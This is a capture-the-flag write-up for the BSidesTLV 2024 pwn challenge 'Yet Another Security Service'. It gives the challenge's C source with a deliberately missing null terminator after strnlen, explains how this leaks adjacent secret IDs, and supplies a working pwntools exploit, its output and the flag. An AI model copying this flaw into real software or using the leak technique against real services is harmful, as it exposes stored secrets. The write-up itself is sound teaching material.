# Yet Another Security Service

 * Category: Pwn
 * 200 Points
 * Solved by the JCTF Team

## Description

> Welcome to our new security services! You can trust us to keep your secrets safely on our online vault.

Contents of `challenge.h`:

```c
#include <stddef.h>
#include <stdint.h>

#define SECRET_DATA_LEN 100
#define SECRET_ID_LEN 20
#define MAX_SECRETS 50
#define RES_MSG_LEN 150

#define PACKED __attribute__((__packed__))

#define ERROR -1
#define SUCCESS 0

struct PACKED meta
{
	uint8_t is_valid;
	uint8_t is_encrypted;
	uint64_t seed;
};

struct PACKED secret
{
	uint8_t secret_id[SECRET_ID_LEN];
	uint32_t reserved;
	uint8_t secret_data[SECRET_DATA_LEN];
};

struct PACKED context_t
{
	char reserved[10]; // meta meta data :) we'll maybe use that later
	struct meta meta_data[MAX_SECRETS];
	struct secret secret_list[MAX_SECRETS];
};

struct PACKED request
{
	uint8_t cmd;
	uint8_t secret_id[SECRET_ID_LEN];
};

struct PACKED request_params
{
	uint8_t is_encrypted;
	uint8_t secret_data[SECRET_DATA_LEN];
};

struct PACKED response
{
	char msg[RES_MSG_LEN];
};

enum commands
{
	SET_SECRET,
	UNSET_SECRET,
	GET_SECRET,
};

void server_main();

```

Contents of `challenge.c`:

```c
// in this challenge we use the musl implementation of libc
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <fcntl.h>
#include <unistd.h>
#include "challenge.h"

struct context_t context = {0};

// thanks chatgpt - that's probably fine :)
uint64_t get_rand_qword(void) {
	uint64_t random_byte;
	int random_fd = open("/dev/random", O_RDONLY);

	if (random_fd < 0) {
		perror("failed to open /dev/random");
		exit(1);
	}

	ssize_t bytes_read = read(random_fd, &random_byte, sizeof(random_byte));
	if (bytes_read < 0) {
		perror("failed to read /dev/random");
		close(random_fd);
		exit(1);
	}

	close(random_fd);
	return random_byte;
}

static int get_secret_index_from_list(uint8_t * secret_id)
{
	for (int i = 0; i < MAX_SECRETS; i++)
	{
		if (context.meta_data[i].is_valid == 0)
			continue;
		if (memcmp(context.secret_list[i].secret_id,
			   secret_id,
			   SECRET_ID_LEN) == 0)
			return i;
	}
	return ERROR;
}

static int get_free_secret_index()
{
	for (int i = 0; i < MAX_SECRETS; i++)
	{
		if(context.meta_data[i].is_valid == 0)
			return i;
	}
	return ERROR;
}

// if the given secret is encrypted then decrypt it
// if it's decrypted then encrypt it
static void encrypt_decrypt(int secret_id)
{
	srand(context.meta_data[secret_id].seed);
	for (int i = 0; i < SECRET_DATA_LEN; i++)
	{
		context.secret_list[secret_id].secret_data[i] ^= rand();
	}
	context.meta_data[secret_id].is_encrypted ^= 1;
}

// if the given secret exist in the database then override it,
// else, create a new secret in the database
static void set_secret(uint8_t* secret_id, uint8_t is_encrypted, uint8_t* secret_data,
		       struct response * res)
{
	int idx = get_secret_index_from_list(secret_id);
	int secret_len = 0;

	if (idx == ERROR)
	{
		idx = get_free_secret_index();
	}

	// copy secret_id (bytes)
	memcpy(context.secret_list[idx].secret_id, secret_id, SECRET_ID_LEN);

	// copy secret content (string)
	secret_len = strnlen((char *)secret_data, SECRET_DATA_LEN);
	memcpy((char *)context.secret_list[idx].secret_data,
		(char *)secret_data,
		secret_len);
	if (secret_len < SECRET_DATA_LEN)
		context.secret_list[idx].secret_data[secret_len] = '\0';

	// mark entry as valid
	context.meta_data[idx].is_valid = 1;
	context.meta_data[idx].is_encrypted = 0;
	context.meta_data[idx].seed = get_rand_qword();
	// zero one byte from the seed as hardening so if someone manage to
	// print it, they won't get all of it
	context.meta_data[idx].seed &= 0xffffffff00ffffff;

	// encrypt if requested
	if(is_encrypted)
	{
		encrypt_decrypt(idx);
	}
	snprintf(res->msg, RES_MSG_LEN, "[+] done! don't forget your secret_id!");
}

static void get_secret(uint8_t* secret_id, struct response * res)
{
	int idx = get_secret_index_from_list(secret_id);

	if (idx == ERROR || context.meta_data[idx].is_valid == 0)
	{
		snprintf(res->msg, RES_MSG_LEN, "[-] can't get secret, invalid secret_id");
		return;
	}

	if(!context.meta_data[idx].is_encrypted)
	{
		snprintf(res->msg, RES_MSG_LEN, "%s", context.secret_list[idx].secret_data);
	}
	else
	{
		encrypt_decrypt(idx); //decrypt
		snprintf(res->msg, RES_MSG_LEN, "%s", context.secret_list[idx].secret_data);
		encrypt_decrypt(idx); // encrypt
	}
}

static void unset_secret(uint8_t* secret_id, struct response * res)
{
	int idx = get_secret_index_from_list(secret_id);

	if (idx == ERROR)
	{
		snprintf(res->msg, RES_MSG_LEN, "[-] can't unset secret, invalid secret_id");
		return;
	}

	context.meta_data[idx].is_valid = 0;
	context.meta_data[idx].is_encrypted = 0;
	context.meta_data[idx].seed = 0;
	memset(context.secret_list[idx].secret_id, 0, SECRET_ID_LEN);
	memset(context.secret_list[idx].secret_data, 0, SECRET_DATA_LEN);
	snprintf(res->msg, RES_MSG_LEN, "[+] done");
}

void process_request(struct request* req, struct request_params* req_params,
		     struct response * res)
{
	switch(req->cmd)
	{
		case GET_SECRET:
			get_secret(req->secret_id, res);
			break;
		case SET_SECRET:
			set_secret(req->secret_id, req_params->is_encrypted,
				   req_params->secret_data, res);
			break;
		case UNSET_SECRET:
			unset_secret(req->secret_id, res);
			break;
		default:
			snprintf(res->msg, RES_MSG_LEN, "[-] invalid command");
			break;
	}
}

size_t read_buffer(void* buffer, size_t size) {
	size_t nread = fread(buffer, 1, size, stdin);
	if (nread < size && nread > 0) {
		fprintf(stderr, "Bad readsize: %zu (connection dropped)\n", nread);
		return 0;
	}
	return nread;
}

void server_main()
{
	while(1)
	{
		struct request req = {0};
		struct request_params req_params = {0};
		struct response res = {0};

		printf(">> ");
		if (!read_buffer(&req, sizeof(req))) {
			break;
		}
		if (req.cmd == SET_SECRET) {
			if (!read_buffer(&req_params, sizeof(req_params)))
				break;
		}

		process_request(&req, &req_params, &res);
		puts(res.msg);
	}
}

```

## Solution

The attached program implements a *Secrets Service*, allowing users to store and read back
secrets based on a *Secret ID*. This is the first of three challenges which share the same
source code, and therefore the program contains multiple bugs. In this writeup, we'll focus
on the bug that's relevant for the first challenge, and explore the other bugs in the
following writeups.

In our case, we will exploit a bug in the `set_secret` function.  
The function receives the secret data from the user, and writes it to the correct location
in the global context, under `context.secret_list[idx].secret_data`:

```c
	// copy secret content (string)
	secret_len = strnlen((char *)secret_data, SECRET_DATA_LEN);
	memcpy((char *)context.secret_list[idx].secret_data,
		(char *)secret_data,
		secret_len);
	if (secret_len < SECRET_DATA_LEN)
		context.secret_list[idx].secret_data[secret_len] = '\0';
```

However, notice how the code handles the NULL terminator logic:

 * It reads the string length using `strnlen`, passing SECRET_DATA_LEN as `maxlen`
 * If the string length is smaller than `SECRET_DATA_LEN` (which is the size
   of the `secret_data` character array), it explicitly appends a NULL terminator

Remember the `strnlen` API definition:

> `size_t strnlen(const char s, size_t maxlen);`
> 
> The `strnlen()` function returns the number of bytes in the string
> pointed to by `s`, excluding the terminating null byte (`'\0'`), but
> at most `maxlen`.  In doing this, `strnlen()` looks only at the first
> `maxlen` characters in the string pointed to by `s` and never beyond `s[maxlen-1]`.
>
> The strnlen() function returns strlen(s), if that is less than 
> maxlen, or maxlen if there is no null terminating ('\0') among 
> the first maxlen characters pointed to by s.

If we pass `strnlen` a string composed of `maxlen` non-NULL characters, it will return 
`maxlen` as the result. And in that case, both the `memcpy` and the condition under it
won't ensure that the string is NULL terminated. 

What would this lead to? Well, if we manage to write to a given slot's `secret_data` a 
string that isn't NULL terminated, we might be able to leak the content of the adjacent memory 
slot when we use `get_secret` to read back the secret data we wrote. This happens since 
`get_secret` uses `snprintf("%s")` to read the secret data:

```c
snprintf(res->msg, RES_MSG_LEN, "%s", context.secret_list[idx].secret_data);
```

When the program tries to read `context.secret_list[idx].secret_data` as a string, it will
continue reading more and more bytes until somewhere along the way it will find a NULL terminator
(or until it reaches `RES_MSG_LEN`, which is 50 bytes larger than `SECRET_DATA_LEN`).  
In our case, the adjacent memory slot next to `secret_data` is the `secret_id` of the next
secret in the array:

```c
struct PACKED context_t
{
	char reserved[10]; // meta meta data :) we'll maybe use that later
	struct meta meta_data[MAX_SECRETS];
	struct secret secret_list[MAX_SECRETS];
};

struct PACKED secret
{
	uint8_t secret_id[SECRET_ID_LEN];
	uint32_t reserved;
	uint8_t secret_data[SECRET_DATA_LEN];
};
```

So, using this flaw, we can try to leak existing Secret IDs, and use the public API
to read their content.

Therefore, the plan is to:
 * Loop 50 times, trying to write a secret with a unique ID for each iteration
 * Read back the secret using the same ID
 * Compare the data we got from the `get_secret` API to the data we wrote
    * If we read back some extra data, we were able to leak the ID of the next secret
 * Use `get_secret` to read the contents of the leaked secret ID

The following `pwntools` script performs this:

```python
# First, generate a pwntools template using:
# $ pwn template --host 0.cloud.chals.io --port 18734

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

from enum import Enum
from ctypes import *

SECRET_DATA_LEN = 100
SECRET_ID_LEN   = 20
MAX_SECRETS     = 50

class Commands(Enum):
	SET_SECRET = 0
	UNSET_SECRET = 1
	GET_SECRET = 2

class Request(Structure):
    _pack_ = 1
    _fields_ = [
        ('cmd',       c_ubyte),
        ('secret_id', c_ubyte * SECRET_ID_LEN)
    ]

class RequestParams(Structure):
    _pack_ = 1
    _fields_ = [
        ('is_encrypted', c_ubyte),
        ('secret_data',  c_ubyte * SECRET_DATA_LEN)
    ]

io = start()

def send_command(command):
    io.send(command)
    io.recvuntil(b">> ")
    return io.recvline(keepends=False)
    io.recvuntil(b">> ")

def set_secret(secret_id, is_encrypted, secret_data):
    if len(secret_id) > SECRET_ID_LEN:
        raise ValueError("Secret ID Length too long")
    if len(secret_data) > SECRET_DATA_LEN:
        raise ValueError("Secret Data Length too long")
    
    encryption = ""
    if is_encrypted:
        encryption = "and encrypting "
    log.info(f"Setting {encryption}secret '{secret_id}' data to: {secret_data}")

    secret_id_bytes = secret_id.encode("ascii")
    request = Request(Commands.SET_SECRET.value, 
                      (c_ubyte * SECRET_ID_LEN)(*secret_id_bytes, 
                                                *([0] * (SECRET_ID_LEN - len(secret_id_bytes)))))
    
    secret_data_bytes = secret_data.encode("ascii")
    request_data = RequestParams(int(is_encrypted), 
                           (c_ubyte * SECRET_DATA_LEN)(*secret_data_bytes, 
                                                       *([0] * (SECRET_DATA_LEN - len(secret_data_bytes)))))
    res = send_command(bytearray(request) + bytearray(request_data))
    if res != b"[+] done! don't forget your secret_id!":
        raise RuntimeError(res)

def get_secret(secret_id):
    if len(secret_id) > SECRET_ID_LEN:
        raise ValueError("Secret ID Length too long")
    
    log.info(f"Getting secret '{secret_id}' data")

    secret_id_bytes = secret_id.encode("ascii")
    request = Request(Commands.GET_SECRET.value, 
                      (c_ubyte * SECRET_ID_LEN)(*secret_id_bytes, 
                                                *([0] * (SECRET_ID_LEN - len(secret_id_bytes)))))
    
    res = send_command(bytearray(request))
    if res == b"[-] can't get secret, invalid secret_id":
        raise RuntimeError(f"Can't read secret {secret_id}")
    return res
    
for i in range(MAX_SECRETS):
    secret_id = f"s{i}"
    secret_data = '.' * SECRET_DATA_LEN
    set_secret(secret_id, False, secret_data)
    try:
        secret = get_secret(secret_id).decode("ascii")
        log.info(f"Secret #{secret_id} read back: {secret}")
        if len(secret) != len(secret_data):
            leaked_id = secret[len(secret_data):]
            secret = get_secret(leaked_id)
            log.info(f"Secret for leaked ID '{leaked_id}' is: {secret}")
    except RuntimeError:
        log.info(f"Failed to read secret #{i}")
        break
```

Output:

```console
┌──(user@kali)-[/media/sf_CTFs/bsides/Yet_Another_Security_Service]
└─$ python3 exploit.py
[+] Opening connection to 0.cloud.chals.io on port 18734: Done
[*] Setting secret 's0' data to: ....................................................................................................
[*] Getting secret 's0' data
[*] Secret #s0 read back: ....................................................................................................
[*] Setting secret 's1' data to: ....................................................................................................
[*] Getting secret 's1' data
[*] Secret #s1 read back: ....................................................................................................
[*] Setting secret 's2' data to: ....................................................................................................
[*] Getting secret 's2' data
[*] Secret #s2 read back: ....................................................................................................
[*] Setting secret 's3' data to: ....................................................................................................
[*] Getting secret 's3' data
[*] Secret #s3 read back: ....................................................................................................
[*] Setting secret 's4' data to: ....................................................................................................
[*] Getting secret 's4' data
[*] Secret #s4 read back: ....................................................................................................
[*] Setting secret 's5' data to: ....................................................................................................
[*] Getting secret 's5' data
[*] Secret #s5 read back: ....................................................................................................
[*] Setting secret 's6' data to: ....................................................................................................
[*] Getting secret 's6' data
[*] Secret #s6 read back: ....................................................................................................
[*] Setting secret 's7' data to: ....................................................................................................
[*] Getting secret 's7' data
[*] Secret #s7 read back: ....................................................................................................
[*] Setting secret 's8' data to: ....................................................................................................
[*] Getting secret 's8' data
[*] Secret #s8 read back: ....................................................................................................
[*] Setting secret 's9' data to: ....................................................................................................
[*] Getting secret 's9' data
[*] Secret #s9 read back: ....................................................................................................
[*] Setting secret 's10' data to: ....................................................................................................
[*] Getting secret 's10' data
[*] Secret #s10 read back: ....................................................................................................
[*] Setting secret 's11' data to: ....................................................................................................
[*] Getting secret 's11' data
[*] Secret #s11 read back: ....................................................................................................
[*] Setting secret 's12' data to: ....................................................................................................
[*] Getting secret 's12' data
[*] Secret #s12 read back: ....................................................................................................
[*] Setting secret 's13' data to: ....................................................................................................
[*] Getting secret 's13' data
[*] Secret #s13 read back: ....................................................................................................
[*] Setting secret 's14' data to: ....................................................................................................
[*] Getting secret 's14' data
[*] Secret #s14 read back: ....................................................................................................
[*] Setting secret 's15' data to: ....................................................................................................
[*] Getting secret 's15' data
[*] Secret #s15 read back: ....................................................................................................
[*] Setting secret 's16' data to: ....................................................................................................
[*] Getting secret 's16' data
[*] Secret #s16 read back: ....................................................................................................gLyBfP5B1swu0Gzj4Z8r
[*] Getting secret 'gLyBfP5B1swu0Gzj4Z8r' data
[*] Secret for leaked ID 'gLyBfP5B1swu0Gzj4Z8r' is: b'          BSidesTLV2024{d0nt_c0nfus3_str1ngs_and_bytes_d2ea31504d093fb21aa5}'
[*] Setting secret 's17' data to: ....................................................................................................
[*] Getting secret 's17' data
[*] Secret #s17 read back: ....................................................................................................
[*] Setting secret 's18' data to: ....................................................................................................
[*] Getting secret 's18' data
[*] Secret #s18 read back: ....................................................................................................
[*] Setting secret 's19' data to: ....................................................................................................
[*] Getting secret 's19' data
[*] Secret #s19 read back: ....................................................................................................
[*] Setting secret 's20' data to: ....................................................................................................
[*] Getting secret 's20' data
[*] Secret #s20 read back: ....................................................................................................
[*] Setting secret 's21' data to: ....................................................................................................
[*] Getting secret 's21' data
[*] Secret #s21 read back: ....................................................................................................
[*] Setting secret 's22' data to: ....................................................................................................
[*] Getting secret 's22' data
[*] Secret #s22 read back: ....................................................................................................
[*] Setting secret 's23' data to: ....................................................................................................
[*] Getting secret 's23' data
[*] Secret #s23 read back: ....................................................................................................
[*] Setting secret 's24' data to: ....................................................................................................
[*] Getting secret 's24' data
[*] Secret #s24 read back: ....................................................................................................
[*] Setting secret 's25' data to: ....................................................................................................
[*] Getting secret 's25' data
[*] Secret #s25 read back: ....................................................................................................
[*] Setting secret 's26' data to: ....................................................................................................
[*] Getting secret 's26' data
[*] Secret #s26 read back: ....................................................................................................
[*] Setting secret 's27' data to: ....................................................................................................
[*] Getting secret 's27' data
[*] Secret #s27 read back: ....................................................................................................
[*] Setting secret 's28' data to: ....................................................................................................
[*] Getting secret 's28' data
[*] Secret #s28 read back: ....................................................................................................
[*] Setting secret 's29' data to: ....................................................................................................
[*] Getting secret 's29' data
[*] Secret #s29 read back: ....................................................................................................
[*] Setting secret 's30' data to: ....................................................................................................
[*] Getting secret 's30' data
[*] Secret #s30 read back: ....................................................................................................
[*] Setting secret 's31' data to: ....................................................................................................
[*] Getting secret 's31' data
[*] Secret #s31 read back: ....................................................................................................
[*] Setting secret 's32' data to: ....................................................................................................
[*] Getting secret 's32' data
[*] Secret #s32 read back: ....................................................................................................
[*] Setting secret 's33' data to: ....................................................................................................
[*] Getting secret 's33' data
[*] Secret #s33 read back: ....................................................................................................
[*] Setting secret 's34' data to: ....................................................................................................
[*] Getting secret 's34' data
[*] Secret #s34 read back: ....................................................................................................
[*] Setting secret 's35' data to: ....................................................................................................
[*] Getting secret 's35' data
[*] Secret #s35 read back: ....................................................................................................
[*] Setting secret 's36' data to: ....................................................................................................
[*] Getting secret 's36' data
[*] Secret #s36 read back: ....................................................................................................
[*] Setting secret 's37' data to: ....................................................................................................
[*] Getting secret 's37' data
[*] Secret #s37 read back: ....................................................................................................flag is not here
[*] Getting secret 'flag is not here' data
[*] Secret for leaked ID 'flag is not here' is: b"really, it's not here :)"
[*] Setting secret 's38' data to: ....................................................................................................
[*] Getting secret 's38' data
[*] Secret #s38 read back: ....................................................................................................
[*] Setting secret 's39' data to: ....................................................................................................
[*] Getting secret 's39' data
[*] Secret #s39 read back: ....................................................................................................flag is not here
[*] Getting secret 'flag is not here' data
[*] Secret for leaked ID 'flag is not here' is: b"really, it's not here :)"
[*] Setting secret 's40' data to: ....................................................................................................
[*] Getting secret 's40' data
[*] Secret #s40 read back: ....................................................................................................
[*] Setting secret 's41' data to: ....................................................................................................
[*] Getting secret 's41' data
[*] Secret #s41 read back: ....................................................................................................
[*] Setting secret 's42' data to: ....................................................................................................
[*] Getting secret 's42' data
[*] Secret #s42 read back: ....................................................................................................
[*] Setting secret 's43' data to: ....................................................................................................
[*] Getting secret 's43' data
[*] Secret #s43 read back: ....................................................................................................
[*] Setting secret 's44' data to: ....................................................................................................
[*] Getting secret 's44' data
[*] Secret #s44 read back: ....................................................................................................
[*] Setting secret 's45' data to: ....................................................................................................
[*] Getting secret 's45' data
[*] Secret #s45 read back: ....................................................................................................
[*] Setting secret 's46' data to: ....................................................................................................
[*] Getting secret 's46' data
[*] Secret #s46 read back: ....................................................................................................
[*] Setting secret 's47' data to: ....................................................................................................
[*] Getting secret 's47' data
[*] Failed to read secret #47
[*] Closed connection to 0.cloud.chals.io port 18734
```

Running the exploit, we see that there were three existing entries in the secret array.  
We can get the flag by reading back `gLyBfP5B1swu0Gzj4Z8r`. The flag is ` BSidesTLV2024{d0nt_c0nfus3_str1ngs_and_bytes_d2ea31504d093fb21aa5}`.